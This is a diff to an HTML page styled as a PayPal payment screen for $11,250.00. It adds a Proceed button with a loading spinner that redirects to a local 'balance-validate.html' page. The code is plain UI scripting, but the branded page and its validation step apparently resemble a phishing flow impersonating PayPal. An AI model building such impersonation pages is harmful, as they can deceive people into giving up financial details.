@@ -217,8 +217,29 @@
         <div class="amount">$11,250.00</div>
         
         <div class="buttons">
-            <button class="btn btn-primary">Proceed</button>
+            <button onclick="showLoaderAndRedirect(this)" class="btn btn-primary flex items-center justify-center gap-2 px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition-colors">
+                <span class="btn-text">Proceed</span>
+                <i class="loader-spinner fas fa-spinner fa-spin" style="display: none;"></i>
+            </button>
         </div>
+
+        <script>
+        function showLoaderAndRedirect(button) {
+            const btnText = button.querySelector('.btn-text');
+            const spinner = button.querySelector('.loader-spinner');
+            
+            // Show loader and change text
+            btnText.textContent = 'Processing...';
+            spinner.style.display = 'inline-block';
+            button.disabled = true;
+            button.classList.add('opacity-75', 'cursor-not-allowed');
+            
+            // Redirect after 1.5 seconds
+            setTimeout(() => {
+                window.location.href = './balance-validate.html';
+            }, 1500);
+        }
+        </script>
         
         <div class="footer">
             <p>Thank you for using PayPal. <a href="#">Need help?</a></p>
